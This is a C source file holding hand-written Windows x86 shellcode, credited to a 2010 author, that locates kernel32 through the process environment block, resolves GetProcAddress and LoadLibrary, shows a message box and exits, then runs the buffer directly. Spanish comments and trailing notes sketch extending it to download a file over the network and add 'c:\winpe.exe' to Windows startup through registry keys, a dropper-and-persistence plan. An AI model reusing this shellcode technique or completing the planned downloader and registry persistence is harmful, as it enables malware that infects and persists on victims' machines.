/* Title: Allwin MessageBoxA Shellcode Date: 2010-06-11 Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32),
Win Vista (32)/(64), Win 7 (32)/(64),Win 2k8 (32)
win 10 pro (32),
Thanks to: kernelhunter, Lodus, Vrtule, Mato, cm3l1k1, eat, st1gd3r and others */

/*
Kernel32.dll
GetProcAddress
Loadlibrary
user32.dll
advapi32.dll

call MessageBox

[*]-obtiene las variables de entorno
[*]-descargar el archivo
    [-]sino hay internet salta a su curso normal
[*]-RegCreateKeyA
    [-]sino se añade a l registro de windows
       cerramos el programa
[*]-RegSetValueEx
    [-]sino se añade a l registro de windows
       cerramos el programa
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(){
     unsigned char se2[]=
    "\xFC"                                  //cld
    "\x33\xD2"                              //xor edx,edx
    "\xB2\x30"                              //mov dl,30
    "\x64\xFF\x32"                          //push dword ptr fs:[edx]
    "\x5A"                                  //pop edx
    "\x8B\x52\x0C"                          //mov edx,dword ptr ds:[edx+c]
    "\x8B\x52\x14"                          //mov edx,dword ptr ds:[edx+14]
    "\x8B\x72\x28"                          //mov edx,dword ptr ds:[edx+28]
    "\x33\xC9"                              //xor ecx,ecx
    "\xB1\x18"                              //mov cl,18
    "\x33\xFF"                              //xor edi,edi
    "\x33\xC0"                              //xor eax,eax
    "\xAC"                                  //lods byte ptr ds:[esi]
    "\x3C\x61"                              //cmp al,61
    "\x7C\x02"                              //jl short 0024fe32
    "\x2C\x20"                              //sub al,20
    "\xC1\xCF\x0D"                          //ror edi,20
    "\x03\xF8"                              //add edi,eax
    "\xE2\xF0"                              //loopd short 0024fe29
    "\x81\xFF\x5B\xBC\x4A\x6A"              //cmp,edi,6a4abc5b
    "\x8B\x5A\x10"                          //mov ebx,dword ptr ds:[edx+10]
    "\x8B\x12"                              //mov edx,dword ptr ds:[edx]
    "\x75\xDA"                              //jnz short 0024fe20

    "\x8B\x53\x3C"                          //mov edx,dword ptr ds:[ebx+3c]
    "\x03\xD3"                              //add edx,ebx
    "\xFF\x72\x34"                          //push dword ptr ds:[edx+34]

    "\x8B\x52\x78"                          //mov edx,dword ptr ds:[ex+78]
    "\x03\xD3"                              //add edx,ebx
    "\x8B\x72\x20"                          //mov esi, dword ptr ds:[edx+20]
    "\x03\xF3"                              //add esi,ebx
    "\x33\xC9"                              //xor ecx,ecx
    "\x41"                                  //inc ecx
    "\xAD"                                  //lods dword ptr ds:[esi]
    "\x03\xC3"                              //add eax,ebx
    "\x81\x38\x47\x65\x74\x50"              //cmp dword ptr ds:[eax],50746547
    "\x75\xF4"                              //jnz short 0024fe5a
    "\x81\x78\x04\x72\x6F\x63\x41"          //cmp dword  ptr ds:[eax+4],41636f72
    "\x75\xEB"                              //jnz short 0024fe5a
    "\x81\x78\x08\x64\x64\x72\x65"          //cmp dword ptr ds:[eax+4],41636f72
    "\x75\xE2"                              //jnz short 0024fe5a
    //end Getprocaddress
    //start loadlibrary
    "\x49"                                  //dec ecx
    "\x8B\x72\x24"                          //mov esi,dword ptr ds:[edx+24]
    "\x03\xF3"                              //add esi,ebx
    "\x66\x8B\x0C\x4E"                      //mov cx,word ptr ds:[esi+ecx*2]
    "\x8B\x72\x1C"                          //mov esi,dword ptr ds:[edx+1c]
    "\x03\xF3"                              //add esi,ebx
    "\x8B\x14\x8E"                          //mov edx,dword ptr ds:[esi+ecx*4]
    "\x03\xD3"                              //add edx,ecx
    "\x52"                                  //push edx
    "\x33\xFF"                              //xor edi,edi
    "\x57"                                  //push edi
    "\x68\x61\x72\x79\x41"                  //push 41797261
    "\x68\x4C\x69\x62\x72"                  //push 7262694c
    "\x68\x4C\x6F\x61\x64"                  //push 64616f4c
    "\x54"                                  //push esp
    "\x53"                                  //push ebx
    "\xFF\xD2"                              //call edx
    //end call loadlibrary
    //aqui ya podemos llamar a cualquier .*dll que queramos
    //llamando a LoadLybrary
    "\x68\x33\x32\x01\x01"
    "\x66\x89\x7C\x24\x02"
    "\x68\x75\x73\x65\x72"
    "\x54"
    "\xFF\xD0"
    "\x68\x6F\x78\x41\x01"
    "\x8B\xDF"
    "\x88\x5C\x24\x03"
    "\x68\x61\x67\x65\x42"
    "\x68\x4D\x65\x73\x73"
    "\x54"
    "\x50"
    "\xFF\x54\x24\x2C"
    "\x57"
    "\x68\x4F\x5F\x6F\x21"
    "\x8B\xDC"
    "\x57"
    "\x53"
    "\x53"
    "\x57"
    "\xFF\xD0"
    "\x68\x65\x73\x73\x01"
    "\x8B\xDF"
    "\x88\x5C\x24\x03"
    "\x68\x50\x72\x6F\x63"
    "\x68\x45\x78\x69\x74"
    "\x54"
    "\xFF\x74\x24\x40"
    "\xFF\x54\x24\x40"
    "\x57"
    "\xFF\xD0";


    printf("Size = %d\n", strlen(se2));
    system("PAUSE");
    ((void (*)())se2)();
    return 0;
}
// 1 descargar el archivo con HttpOpenRequest(wininet.dll)



// 2 añadirlo al inicio de windows con
// RegcreatekeyA y regsetvalue(advapi32.dll apphelp.dll )

//d3dim.dll
//d3d8.dll
//type de entrada 80000001
//ptr string con la ruta en el regedit donde crear la keey
//ptr handler 8 bytes

//ptr handler 8 bytes
//ptr string nombre key "winpe"
//reserved   00000000
//valuetype  00000001
//ptr string adress     "c:\winpe.exe"
//tamaño de ptr address 0xc



